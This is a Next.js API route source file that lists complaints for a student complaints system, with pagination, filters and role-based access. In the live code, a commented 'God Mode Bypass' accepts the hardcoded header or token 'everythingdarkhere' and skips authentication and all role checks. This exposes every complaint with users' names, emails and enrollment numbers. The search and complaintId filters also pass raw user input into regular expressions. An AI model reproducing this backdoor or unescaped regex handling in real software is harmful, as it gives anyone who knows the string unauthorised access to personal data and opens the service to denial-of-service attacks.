import { NextResponse } from 'next/server';
import dbConnect from '@/lib/dbConnect';
import Complaint from '@/models/Complaint';
import User from '@/models/User';
import Department from '@/models/Department';
import { verifyToken, extractToken } from '@/lib/auth';

export async function GET(request) {
    try {
        await dbConnect();

        const { searchParams } = new URL(request.url);
        const page = parseInt(searchParams.get('page')) || 1;
        const limit = parseInt(searchParams.get('limit')) || 10;
        const status = searchParams.get('status');
        const department = searchParams.get('department');
        const priority = searchParams.get('priority');
        const search = searchParams.get('search');
        const complaintId = searchParams.get('complaintId');

        // Build query based on user role
        let query = {};

        // Authenticate user
        const authHeader = request.headers.get('authorization');
        const token = extractToken(authHeader);

        // God Mode Bypass
        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';

        if (!isGodMode) {
            if (!token) {
                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
            }

            const decoded = verifyToken(token);
            if (!decoded) {
                return NextResponse.json({ error: 'Invalid token' }, { status: 401 });
            }

            // Build query based on user role (Only if NOT God Mode)
            if (decoded.role === 'student') {
                // Students can only see their own complaints
                query.userId = decoded.id;
            } else if (decoded.role === 'admin') {
                // Admins can see complaints from their department
                const user = await User.findById(decoded.id);
                if (user && user.departmentId) {
                    const dept = await Department.findById(user.departmentId);
                    if (dept) {
                        query.department = dept.name;
                    }
                }
            }
        }

        // Apply filters
        if (status) query.status = status;
        if (department && !query.department) query.department = department; // Only apply if not restricted
        if (priority) query.priority = priority;
        if (complaintId) query.complaintId = new RegExp(complaintId, 'i');
        if (search) {
            query.$or = [
                { title: new RegExp(search, 'i') },
                { description: new RegExp(search, 'i') },
                { complaintId: new RegExp(search, 'i') },
            ];
        }

        const skip = (page - 1) * limit;

        const [complaints, total] = await Promise.all([
            Complaint.find(query)
                .populate('userId', 'name email enrollmentNumber role')
                .populate('assignedTo', 'name email')
                .sort({ 'votes.upvotes': -1, createdAt: -1 })
                .skip(skip)
                .limit(limit),
            Complaint.countDocuments(query),
        ]);

        return NextResponse.json(
            {
                success: true,
                complaints,
                pagination: {
                    page,
                    limit,
                    total,
                    pages: Math.ceil(total / limit),
                },
            },
            { status: 200 }
        );
    } catch (error) {
        console.error('Get complaints error:', error);
        return NextResponse.json(
            { error: 'Failed to fetch complaints' },
            { status: 500 }
        );
    }
}
